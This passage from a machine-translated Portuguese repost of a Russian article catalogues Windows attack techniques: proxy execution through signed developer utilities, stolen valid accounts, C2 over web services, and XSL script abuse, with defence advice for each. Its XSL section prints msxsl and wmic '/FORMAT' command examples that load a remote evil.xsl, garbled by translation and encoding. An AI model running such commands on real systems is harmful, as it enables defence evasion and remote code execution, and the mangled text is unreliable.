proxy de c√≥digos maliciosos no sistema operacional, ignorando os mecanismos de seguran√ßa e as folhas de aplicativos em branco. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ MSBulid √© uma plataforma de desenvolvimento de software usada no Visual Studio. Ele usa projetos na forma de arquivos XML que descrevem os requisitos para a constru√ß√£o de v√°rias plataformas e configura√ß√µes. O MSBuild do .NET vers√£o 4 permite inserir c√≥digo C # em um projeto XML, compil√°-lo e execut√°-lo. MSBulid.exe √© assinado pelo Microsoft Digital Certificate.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ DNX - .Net Execution Environmant (dnx.exe) √© um kit de desenvolvimento para o Visual Studio Enterprise. Descontinuado desde a CLI do .NET Core em 2016. O DNX est√° ausente nas compila√ß√µes padr√£o do Windows e s√≥ pode estar presente nos hosts do desenvolvedor ao usar o .Net Core e o ASP.NET Core 1.0. O Dnx.exe √© assinado digitalmente e pode ser usado para execu√ß√£o de c√≥digo proxy. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ RCSI √© uma interface de linha de comando n√£o interativa para C #, semelhante ao csi.exe. Foi introduzido em uma vers√£o anterior da plataforma do compilador Roslyn .Net. Rcsi.exe √© assinado pelo Microsoft Digital Certificate. Os arquivos de script C # .csx podem ser gravados e executados usando o Rcsi.exe no prompt de comando do Windows.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ WinDbg / CDB √© o kernel do MS Windows e um utilit√°rio para depura√ß√£o no modo de usu√°rio. O depurador de console da Microsoft cdb.exe tamb√©m √© um depurador no modo de usu√°rio. Ambos os utilit√°rios podem ser usados ‚Äã‚Äãcomo ferramentas independentes. Comumente usado no desenvolvimento de software, engenharia reversa e n√£o pode ser encontrado em sistemas Windows regulares. Os arquivos WinDbg.exe e CDB.exe s√£o assinados pelo Microsoft Digital Certificate e podem ser usados ‚Äã‚Äãpara codificar proxy. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Ä¢ Tracker - utilit√°rio de rastreamento de arquivos tracker.exe. Inclu√≠do no .NET como parte do MSBuild. Usado para registrar chamadas no sistema de arquivos do Windows 10. Os atacantes podem usar o tracker.exe para executar a DLL em v√°rios processos. Tracker.exe tamb√©m √© assinado com um certificado da Microsoft. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i>       ,        . <br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Valid Accounts</a> </h3><br>  <i>Descri√ß√£o: os</i> invasores podem roubar as credenciais de uma conta de usu√°rio ou servi√ßo espec√≠fica usando credenciais de acesso, capturar credenciais no processo de intelig√™ncia usando engenharia social.  As credenciais comprometidas podem ser usadas para ignorar os sistemas de controle de acesso e obter acesso a sistemas remotos e servi√ßos externos, como VPN, OWA, √Årea de Trabalho Remota, ou para obter privil√©gios elevados em sistemas e √°reas espec√≠ficos da rede.  Se o cen√°rio for bem-sucedido, os invasores podem recusar malware para dificultar a detec√ß√£o.  Al√©m disso, os invasores podem criar contas usando nomes e senhas predefinidos para manter o acesso ao backup em caso de tentativas frustradas de usar outros meios. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> aplique uma pol√≠tica de senha, siga as recomenda√ß√µes para projetar e administrar uma rede corporativa para limitar o uso de contas privilegiadas em todos os n√≠veis administrativos.  Verifica√ß√µes regulares de contas locais e de dom√≠nio e seus direitos, a fim de identificar aquelas que podem permitir que um invasor obtenha amplo acesso.  Monitorando a atividade da conta usando sistemas SIEM. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Servi√ßo Web</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o: os</i> invasores podem usar um servi√ßo da Web externo leg√≠timo em execu√ß√£o como forma de enviar comandos para controlar um sistema infectado.  Os servidores de gerenciamento s√£o chamados de Comando e controle (C&amp;C ou C2).  Sites e redes sociais populares podem atuar como um mecanismo para o C2, e v√°rios servi√ßos p√∫blicos, como Google ou Twitter, tamb√©m podem ser usados.  Tudo isso ajuda a ocultar atividades maliciosas no fluxo geral de tr√°fego.  Os servi√ßos da Web geralmente usam SSL / TLS, para que os advers√°rios obtenham uma camada extra de prote√ß√£o. <br><br>  <i>Recomenda√ß√µes de seguran√ßa:</i> Firewalls e proxies da Web podem ser usados ‚Äã‚Äãpara implementar pol√≠ticas de comunica√ß√£o de rede externa.  Os sistemas IDS / IPS que usam an√°lise de assinatura podem detectar malware conhecido no n√≠vel da rede.  No entanto, vale considerar que, com o tempo, os oponentes alterar√£o as assinaturas da ferramenta C2 ou reconstruir√£o os protocolos de forma a evitar a detec√ß√£o com a ajuda de defesas usadas com frequ√™ncia.  O uso de ferramentas para monitorar o comportamento do usu√°rio tamb√©m pode aumentar a chance de detectar atividades anormais. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Processamento de script XSL</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o: a</i> Extensible Stylesheet Language (* .xsl) √© normalmente usada para descrever o processamento e a renderiza√ß√£o de dados em arquivos XML.  Para oferecer suporte a opera√ß√µes complexas em XSL, √© poss√≠vel incorporar scripts em v√°rios idiomas no c√≥digo.  Os invasores podem abusar dessa funcionalidade para executar arquivos arbitr√°rios.  Semelhante √† t√©cnica de abuso de utilit√°rios de desenvolvedor confi√°veis ‚Äã‚Äã(Utilit√°rios de Desenvolvedor Confi√°veis), o utilit√°rio confi√°vel msxsl.exe, que converte um documento XML em outro formul√°rio (html, wml, rtf, pdf etc.) pode ser usado para executar JavaScript malicioso incorporado em local ou arquivos XSL exclu√≠dos (referenciados via URL).  Como o msxsl.exe n√£o est√° instalado por padr√£o, o advers√°rio provavelmente precisar√° compact√°-lo e outros arquivos necess√°rios.  Exemplo de chamada msxsl.exe: <br>  <i>Clientes msxsl.exe [.] script xml [.] xsl</i> . <br>  Outra varia√ß√£o dessa t√©cnica, chamada Squiblytwo, √© usar o WMI para chamar JScript ou VBScript a partir de um arquivo xsl.  Essa t√©cnica, como o Squiblydoo, que abusa do regsrv32.exe, tamb√©m usa ferramentas confi√°veis ‚Äã‚Äãdo Windows: <br>  ‚Ä¢ Arquivo local: <i>lista de processos wmic /FORMAT:evil[..BIZxsl;</i> <br>  ‚Ä¢ Arquivo remoto: <i>wmic os get / FORMAT</i> : <i>decidehttps [</i> : <i>; // exemplo [. ‚Ä† com / evil [. ‚Ä† xsl. "</i> <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> Se o msxsl.exe n√£o for usado no ambiente protegido, bloqueie sua execu√ß√£o.  Desabilitar o WMI, pelo contr√°rio, pode levar √† instabilidade do sistema e, portanto, requer uma avalia√ß√£o preliminar das consequ√™ncias. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt432624/">https://habr.com/ru/post/pt432624/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt432612/index.html">Nas escolas da regi√£o de Kirov ganhou a F√°brica de programadores</a></li>
<li><a href="../pt432616/index.html">Curso MIT "Seguran√ßa de sistemas de computadores". Palestra 20: Seguran√ßa de Telefonia M√≥vel, Parte 1</a></li>
<li><a href="../pt432618/index.html">Curso MIT "Seguran√ßa de sistemas de computadores". Palestra 20: Seguran√ßa de Telefonia M√≥vel, Parte 2</a></li>
<li><a href="../pt432620/index.html">Curso MIT "Seguran√ßa de sistemas de computadores". Palestra 20: Seguran√ßa de Telefonia M√≥vel, Parte 3</a></li>
<li><a href="../pt432622/index.html">Precisa de mais borr√µes diferentes</a></li>
<li><a href="../pt432626/index.html">Maneiras de interagir com o sistema: de fitas perfuradas a neurointerfaces</a></li>
<li><a href="../pt432628/index.html">@Pythonetc novembro de 2018</a></li>
<li><a href="../pt432630/index.html">Tudo o que voc√™ queria saber sobre o processamento de consultas, mas tinha vergonha de perguntar</a></li>
<li><a href="../pt432632/index.html">A hist√≥ria de Lenny, o troll de telefone de spam favorito do Internet Troll</a></li>
<li><a href="../pt432634/index.html">Vis√£o Geral de Cinco Bibliotecas de Desenvolvimento Web HTTP</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>